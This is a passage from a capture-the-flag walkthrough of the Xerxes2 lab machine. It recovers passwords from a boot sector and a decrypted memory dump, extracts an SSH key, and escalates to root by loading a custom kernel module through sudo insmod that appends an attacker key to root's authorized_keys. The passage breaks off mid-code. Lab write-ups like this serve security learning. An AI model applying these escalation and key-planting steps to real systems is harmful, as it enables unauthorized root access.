<span style=color:#ae81ff>00000020</span>  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>61</span> 6D 0A  <span style=color:#ae81ff>68</span> E0 <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>17</span>   BC <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>68</span>  C0 <span style=color:#ae81ff>07</span> 1F EB eam.h......h....
<span style=color:#ae81ff>00000030</span>  <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>59</span> <span style=color:#ae81ff>81</span> F9  4D 5A <span style=color:#ae81ff>74</span> 0C   B4 0E <span style=color:#ae81ff>86</span> C1  CD <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>86</span> C5 !Y..MZt.........
<span style=color:#ae81ff>00000040</span>  CD <span style=color:#ae81ff>10</span> EB ED  BE <span style=color:#ae81ff>55</span> <span style=color:#ae81ff>00</span> AC   <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>02</span> EB FE  B4 0E CD <span style=color:#ae81ff>10</span> .....U..u.......
<span style=color:#ae81ff>00000050</span>  EB F5 EB <span style=color:#ae81ff>72</span>  E9 2D 2D <span style=color:#ae81ff>57</span>   <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>52</span> 4E <span style=color:#ae81ff>49</span>  4E <span style=color:#ae81ff>47</span> 2D 2D ...r.--WARNING--
<span style=color:#ae81ff>00000060</span>  0A <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>55</span> 6E <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>75</span>   <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>68</span> 6F <span style=color:#ae81ff>72</span>  <span style=color:#ae81ff>69</span> 7A <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> .   Unauthorized
<span style=color:#ae81ff>00000070</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>69</span> 6C  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>63</span>   <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>69</span> 6C file access wil
<span style=color:#ae81ff>00000080</span>  6C <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>70</span>   6F <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>64</span> 2E 0A <span style=color:#ae81ff>20</span> l be reported..
<span style=color:#ae81ff>00000090</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>45</span> <span style=color:#ae81ff>52</span> <span style=color:#ae81ff>58</span>   <span style=color:#ae81ff>45</span> <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>77</span>  <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>65</span> XERXES wishe
000000A0  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>79</span> 6F  <span style=color:#ae81ff>75</span> 0A <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span>   <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>20</span> s you.
000000B0  <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>20</span> 6D 6F  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>70</span>   <span style=color:#ae81ff>72</span> 6F <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>75</span>  <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>76</span> a most productiv
000000C0  <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>61</span>  <span style=color:#ae81ff>79</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>68</span> 6F   <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>59</span> <span style=color:#ae81ff>58</span>  <span style=color:#ae81ff>68</span> 0D 0A <span style=color:#ae81ff>68</span> e day.howhYXh..h
000000D0  <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>68</span>  7A <span style=color:#ae81ff>68</span> 4F <span style=color:#ae81ff>77</span>   <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>34</span> <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>68</span>  0A <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>67</span> 7ihhzhOwh45h.@hg
000000E0  <span style=color:#ae81ff>49</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>20</span> 2C  <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>23</span> 6F <span style=color:#ae81ff>68</span>   4D 5A <span style=color:#ae81ff>68</span> 0A  0A <span style=color:#ae81ff>68</span> 4E 6C Ih ,h#ohMZh..hNl
000000F0  <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>57</span> <span style=color:#ae81ff>68</span>  <span style=color:#ae81ff>46</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>61</span>   6D <span style=color:#ae81ff>68</span> 0A <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>68</span> 3A <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>68</span> haWhFuhamh. h: h
<span style=color:#ae81ff>00000100</span>  <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>64</span>  <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>68</span> 6F <span style=color:#ae81ff>72</span>   <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>68</span>  <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>20</span> ishd horhswhash
<span style=color:#ae81ff>00000110</span>  <span style=color:#ae81ff>70</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>65</span>  <span style=color:#ae81ff>68</span> 0A <span style=color:#ae81ff>54</span> E9   <span style=color:#ae81ff>17</span> FF <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> phheh.T.........
<span style=color:#ae81ff>00000120</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000130</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000140</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000150</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000160</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000170</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000180</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
<span style=color:#ae81ff>00000190</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001A0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001B0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001C0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001D0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001E0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> ................
000001F0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>   <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>55</span> AA ..............U.
<span style=color:#ae81ff>00000200</span>  <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>44</span> <span style=color:#ae81ff>46</span>  2D <span style=color:#ae81ff>31</span> 2E <span style=color:#ae81ff>35</span>   0A <span style=color:#ae81ff>25</span> D0 D4  C5 D8 0A <span style=color:#ae81ff>34</span> %PDF-1.5.%.....4
</code></pre></div><p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# head -c <span style=color:#ae81ff>512</span> polito.pdf &gt; first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase <span style=color:#ae81ff>3</span> data file with memo<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1146103071</span> records<span style=color:#f92672>)</span>

root@kali:~# tail -c +512 polito.pdf &gt; second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
</code></pre></div><p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href=http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout>structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>
<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>
<figure>
<img loading=lazy src=/images/xerxesII_qemu_boot.png>
</figure>
<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>polito@xerxes2:~$ gpg -d dump.gpg &gt; decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with <span style=color:#ae81ff>1</span> passphrase
gpg: WARNING: message was not integrity protected

polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data

polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r--r-- <span style=color:#ae81ff>1</span> polito polito 126M Aug <span style=color:#ae81ff>10</span> 02:12 decrypted_dump
</code></pre></div><p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>
<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>polito@xerxes2:~$ grep <span style=color:#66d9ef>$(</span>ls /opt/backup/<span style=color:#66d9ef>)</span> decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
</code></pre></div><p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar

polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive <span style=color:#f92672>(</span>GNU<span style=color:#f92672>)</span>

polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
</code></pre></div><p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
<span style=color:#e6db74>`</span>MM<span style=color:#f92672>(</span>   <span style=color:#f92672>)</span>P<span style=color:#e6db74>&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span style=color:#ae81ff>\ </span> 6MMMMb
 <span style=color:#e6db74>`</span>MM<span style=color:#e6db74>`</span> ,P  6M<span style=color:#e6db74>&#39;  `Mb MM69 &#34;  `MM` ,P  6M&#39;</span>  <span style=color:#e6db74>`</span>Mb MM<span style=color:#e6db74>&#39;    ` MM&#39;</span>  <span style=color:#e6db74>`</span>Mb
  <span style=color:#e6db74>`</span>MM,P   MM    MM MM<span style=color:#e6db74>&#39;      `MM,P   MM    MM YM.           ,MM
</span><span style=color:#e6db74>   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
   d<span style=color:#e6db74>`</span>MM.  MM       MM        d<span style=color:#e6db74>`</span>MM.  MM            <span style=color:#e6db74>`</span>Mb   ,M<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>  d&#39;</span> <span style=color:#e6db74>`</span>MM. YM    d9 MM       d<span style=color:#e6db74>&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
_d_  _<span style=color:#f92672>)</span>MM_ YMMMM9 _MM_    _d_  _<span style=color:#f92672>)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM

You have new mail.
korenchkin@xerxes2:~$
</code></pre></div><p><em>You have new mail.</em></p>
<h2 id=becoming-root>becoming root<a hidden class=anchor aria-hidden=true href=#becoming-root>#</a></h2>
<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> korenchkin on this host:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin

User korenchkin may run the following commands on this host:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /sbin/insmod, <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /sbin/rmmod
</code></pre></div><p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>
<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/module.h&gt;       /* Needed by all modules */</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/init.h&gt;         /* Needed for the macros */</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> __init <span style=color:#a6e22e>hello_start</span>(<span style=color:#66d9ef>void</span>)
{
    printk(KERN_INFO <span style=color:#e6db74>&#34;Loading hello module...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> __exit <span style=color:#a6e22e>hello_end</span>(<span style=color:#66d9ef>void</span>)
{
    printk(KERN_INFO <span style=color:#e6db74>&#34;Goodbye Mr.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
}

module_init(hello_start);
module_exit(hello_end);
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-make data-lang=make>obj-m <span style=color:#f92672>+=</span> hello.o

<span style=color:#a6e22e>all</span><span style=color:#f92672>:</span>
    make -C /lib/modules/<span style=color:#66d9ef>$(</span>shell uname -r<span style=color:#66d9ef>)</span>/build M<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>PWD<span style=color:#66d9ef>)</span> modules

<span style=color:#a6e22e>clean</span><span style=color:#f92672>:</span>
    make -C /lib/modules/<span style=color:#66d9ef>$(</span>shell uname -r<span style=color:#66d9ef>)</span>/build M<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>PWD<span style=color:#66d9ef>)</span> clean
</code></pre></div><p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M<span style=color:#f92672>=</span>/home/korenchkin/kern modules
make<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>: Entering directory <span style=color:#e6db74>`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>  CC [M]  /home/korenchkin/kern/hello.o
</span><span style=color:#e6db74>  Building modules, stage 2.
</span><span style=color:#e6db74>  MODPOST 1 modules
</span><span style=color:#e6db74>  CC      /home/korenchkin/kern/hello.mod.o
</span><span style=color:#e6db74>  LD [M]  /home/korenchkin/kern/hello.ko
</span><span style=color:#e6db74>make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>

korenchkin@xerxes2:~/kern$ sudo insmod hello.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>68192.983366<span style=color:#f92672>]</span> hello: module license <span style=color:#e6db74>&#39;unspecified&#39;</span> taints kernel.
<span style=color:#f92672>[</span>68192.983369<span style=color:#f92672>]</span> Disabling lock debugging due to kernel taint
<span style=color:#f92672>[</span>68192.983637<span style=color:#f92672>]</span> Loading hello module...
korenchkin@xerxes2:~/kern$
</code></pre></div><p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h></code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>
<p><em>insert loud crash and burn sound here</em></p>
<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href=https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html>kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>
<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href=http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage>this</a> amongst other pieces of information helped get the ball rolling.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#include &lt;linux/module.h&gt;       /* Needed by all modules */</span>
<span style=color:#75715e>#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span>
<span style=color:#75715e>#include &lt;linux/init.h&gt;         /* Needed for the macros */</span>

/* For our shell ^_^ */
<span style=color:#75715e>#include&lt;linux/kmod.h&gt;</span>

int get_root <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>
<span style=color:#f92672>{</span>

    char * envp<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> <span style=color:#f92672>{</span> <span style=color:#e6db74>&#34;HOME=/&#34;</span>, NULL <span style=color:#f92672>}</span>;
    char *argv<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> <span style=color:#f92672>{</span> <span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys&#34;</span>, NULL<span style=color:#f92672>}</span>;
    printk<span style=color:#f92672>(</span>KERN_INFO <span style=color:#e6db74>&#34;Call Usermodehelper...\n&#34;</span><span style=color:#f92672>)</span>;
